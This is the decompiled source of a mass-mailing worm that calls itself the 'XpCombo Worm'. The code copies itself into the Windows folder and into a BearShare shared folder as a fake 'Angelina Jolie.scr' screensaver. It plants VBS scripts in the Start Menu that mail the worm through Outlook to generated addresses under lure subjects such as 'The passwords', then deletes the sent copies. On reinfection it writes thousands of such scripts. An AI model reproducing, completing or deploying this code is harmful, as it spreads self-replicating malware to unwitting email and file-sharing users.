using System;
using System.IO;
using System.Reflection;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Module1
{
	private static string filnam = "xpc1";

	private static string v = " ";

	private static string i;

	private static string p;

	private static string u;

	private static int t = 1;

	private static string o;

	private static string k = ".vbs";

	private static int l = 0;

	private static string m;

	private static string[] a = new string[11];

	private static string[] b = new string[11];

	private static string c;

	private static string[] d = new string[51];

	private static string[] e = new string[6];

	private static string[] h = new string[69];

	private static string[] f = new string[4];

	private static string[] g = new string[4];

	private static string q;

	private static string x;

	private static string y;

	private static string z;

	private static string r;

	private static Module xp = Assembly.GetExecutingAssembly().GetModules()[0];

	[STAThread]
	public static void main()
	{
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		i = "Owner";
		o = Environment.UserName;
		if ((StringType.StrCmp(o, i, false) == 0) | File.Exists("C:\\windows\\fr8i.exe"))
		{
			Interaction.MsgBox((object)"You have been infected by XpCombo Worm Created By LoTti", (MsgBoxStyle)0, (object)null);
			full();
			return;
		}
		FileSystem.FileCopy(xp.FullyQualifiedName, "" + filnam);
		FileSystem.FileCopy(filnam, "C:\\Windows\\fr8i.exe");
		if (StringType.StrCmp(FileSystem.Dir("c:\\program files\\BearShare\\my shared folder", (FileAttribute)16), "", false) == 0)
		{
			FileSystem.MkDir("c:\\program files\\BearShare\\my shared folder");
		}
		FileSystem.FileCopy(filnam, "C:\\Program Files\\BearShare\\my shared folder\\Angelina Jolie.scr");
		t = 1;
		checked
		{
			do
			{
				l++;
				m = StringType.FromInteger(l) + k;
				d[0] = "\"joan";
				d[1] = "\"michelle";
				d[2] = "\"brian";
				d[3] = "\"sinead";
				d[4] = "\"mary";
				d[5] = "\"sonia";
				d[6] = "\"damien";
				d[7] = "\"caoibhe";
				d[8] = "\"kevin";
				d[9] = "\"aishling";
				d[10] = "\"maree";
				d[11] = "\"nicola";
				d[12] = "\"debbie";
				d[13] = "\"susan";
				d[14] = "\"naoimh";
				d[15] = "\"bridget";
				d[16] = "\"declan";
				d[17] = "\"nuala";
				d[18] = "\"micheal";
				d[19] = "\"anthony";
				d[20] = "\"joseph";
				d[21] = "\"james";
				d[22] = "\"keirin";
				d[23] = "\"john";
				d[24] = "\"ronan";
				d[25] = "\"gavin";
				d[26] = "\"david";
				d[27] = "\"peter";
				d[28] = "\"steven";
				d[29] = "\"colin";
				d[30] = "\"katie";
				d[31] = "\"kathy";
				d[32] = "\"noirin";
				d[33] = "\"julia";
				d[34] = "\"julie";
				d[35] = "\"wayne";
				d[36] = "\"sean";
				d[37] = "\"shaun";
				d[38] = "\"shane";
				d[39] = "\"linda";
				d[40] = "\"tanya";
				d[41] = "\"tammy";
				d[42] = "\"abbey";
				d[43] = "\"robyn";
				d[44] = "\"robert";
				d[45] = "\"rachel";
				d[46] = "\"naoimi";
				d[47] = "\"natalie";
				d[48] = "\"lauren";
				d[49] = "\"gerard";
				d[50] = "\"vincent";
				h[0] = "1";
				h[1] = "1995";
				h[2] = "1996";
				h[3] = "1997";
				h[4] = "1998";
				h[5] = "1999";
				h[6] = "2000";
				h[7] = "2003";
				h[8] = "keane";
				h[9] = "obrien";
				h[10] = "kelly";
				h[11] = "oreilly";
				h[12] = "whelan";
				h[13] = "linnane";
				h[14] = "haze";
				h[15] = "oneill";
				h[16] = "mcnamara";
				h[17] = "heinz";
				h[18] = "hally";
				h[19] = "mcmahon";
				h[20] = "lynch";
				h[21] = "carthy";
				h[22] = "osullivan";
				h[23] = "larkin";
				h[24] = "walshe";
				h[25] = "clancy";
				h[26] = "nolan";
				h[27] = "griffin";
				h[28] = "casey";
				h[29] = "oconnell";
				h[30] = "odonnell";
				h[31] = "chambers";
				h[32] = "mulqueen";
				h[33] = "mulcare";
				h[34] = "coyne";
				h[35] = "kerse";
				h[36] = "burke";
				h[37] = "mcinerney";
				h[38] = "talty";
				h[39] = "mcswiggan";
				h[40] = "brown";
				h[41] = "given";
				h[42] = "mcgibney";
				h[43] = "coffey";
				h[44] = "quealy";
				h[45] = "";
				h[46] = "odea";
				h[47] = "oshea";
				h[48] = "ryan";
				h[49] = "troy";
				h[50] = "welsh";
				h[51] = "neylon";
				h[52] = "barrett";
				h[53] = "lavrey";
				h[54] = "ginnane";
				h[55] = "hopkins";
				h[56] = "hoskins";
				h[57] = "carey";
				h[58] = "king";
				h[59] = "thompson";
				h[60] = "bronson";
				h[61] = "grogan";
				h[62] = "meeney";
				h[63] = "monaghan";
				h[64] = "moroney";
				h[65] = "lohan";
				h[66] = "lucas";
				h[67] = "healey";
				h[67] = "";
				h[68] = "crowley";
				e[0] = "@yahoo.co.uk\"";
				e[1] = "@hotmail.com\"";
				e[2] = "@yahoo.co.uk\"";
				e[3] = "@hotmail.com\"";
				e[4] = "@yahoo.co.uk\"";
				e[5] = "@hotmail.com\"";
				x = d[(int)Math.Round(VBMath.Rnd() * 7f + VBMath.Rnd() * 12f + VBMath.Rnd() * 11f + VBMath.Rnd() * 1f + VBMath.Rnd() * 19f)];
				y = e[(int)Math.Round(VBMath.Rnd() * 5f)];
				q = h[(int)Math.Round(VBMath.Rnd() * 12f + VBMath.Rnd() * 16f + VBMath.Rnd() * 4f + VBMath.Rnd() * 13f + VBMath.Rnd() * 13f + VBMath.Rnd() * 10f)];
				z = x + q + y;
				a[0] = "\"Oh my god\"";
				a[1] = "\"Your document\"";
				a[2] = "\"Heres the file\"";
				a[3] = "\"The passwords\"";
				a[4] = "\"Thanks for this\"";
				a[5] = "\"you have to see it\"";
				a[6] = "\"look at this\"";
				a[7] = "\"this is mad\"";
				a[8] = "\"hi how are you\"";
				a[9] = "\"Whats the Story\"";
				a[10] = "\"Here it is i think\"";
				b[0] = "\"Yeah here it is i found it last nite\"";
				b[1] = "\"Do you want it or not\"";
				b[2] = "\"This is the best i have seen yet\"";
				b[3] = "\"Well i havent got much time but here it is\"";
				b[4] = "\"I didnt have much time to look at it but here take it\"";
				b[5] = "\"I got this from a friend\"";
				b[6] = "\"Do you want this file\"";
				b[7] = "\"I cant believe i had this\"";
				b[8] = "\"Try it and tell me what you think\"";
				b[9] = "\"I think you asked me for this if not just delete it\"";
				b[10] = "\"Heres the file you asked for\"";
				c = Strings.StrReverse(")0(metIetaerC.ppAkooltuO");
				g[0] = "Set OutlookApp = CreateObject(\"Outlook.Application\")";
				g[1] = "Set OutlookApp = CreateObject(\"Outlook.Application\")";
				g[2] = "Set OutlookApp = CreateObject(\"Outlook.Application\")";
				FileStream stream = new FileStream("c:\\Documents and Settings\\All Users\\Start Menu\\" + m, FileMode.Create, FileAccess.Write);
				StreamWriter streamWriter = new StreamWriter(stream);
				streamWriter.WriteLine("On Error Resume Next");
				streamWriter.WriteLine("" + g[(int)Math.Round(VBMath.Rnd() * 2f)]);
				streamWriter.WriteLine("If Not OutlookApp = \"\" Then");
				streamWriter.WriteLine("Set OutlookEmail = " + c);
				streamWriter.WriteLine("OutlookEmail.Recipients.Add " + z);
				streamWriter.WriteLine("OutlookEmail.Subject = " + a[(int)Math.Round(VBMath.Rnd() * 10f)]);
				streamWriter.WriteLine("OutlookEmail.Body = " + b[(int)Math.Round(VBMath.Rnd() * 10f)]);
				streamWriter.WriteLine("OutlookEmail.Attachments.Add(\"c:\\fr8i.exe\")");
				streamWriter.WriteLine("OutlookEmail.Importance = 1");
				streamWriter.WriteLine("OutlookEmail.DeleteAfterSubmit = True");
				streamWriter.WriteLine("OutlookEmail.Send");
				streamWriter.WriteLine("End If");
				streamWriter.Close();
				t++;
			}
			while (t <= 50);
		}
	}

	public static void full()
	{
		t = 1;
		checked
		{
			do
			{
				l++;
				m = StringType.FromInteger(l) + k;
				FileStream stream = new FileStream("c:\\Documents and Settings\\All Users\\Start Menu\\" + m, FileMode.Create, FileAccess.Write);
				StreamWriter streamWriter = new StreamWriter(stream);
				streamWriter.WriteLine("On Error Resume Next");
				streamWriter.WriteLine("" + g[(int)Math.Round(VBMath.Rnd() * 2f)]);
				streamWriter.WriteLine("If Not OutlookApp = \"\" Then");
				streamWriter.WriteLine("Set OutlookEmail = " + c);
				streamWriter.WriteLine("OutlookEmail.Recipients.Add " + z);
				streamWriter.WriteLine("OutlookEmail.Subject = " + a[(int)Math.Round(VBMath.Rnd() * 10f)]);
				streamWriter.WriteLine("OutlookEmail.Body = " + b[(int)Math.Round(VBMath.Rnd() * 10f)]);
				streamWriter.WriteLine("OutlookEmail.Attachments.Add(\"c:\\fr8i.exe\")");
				streamWriter.WriteLine("OutlookEmail.Importance = 1");
				streamWriter.WriteLine("OutlookEmail.DeleteAfterSubmit = True");
				streamWriter.WriteLine("OutlookEmail.Send");
				streamWriter.WriteLine("End If");
				streamWriter.Close();
				t++;
			}
			while (t <= 3600);
		}
	}
}
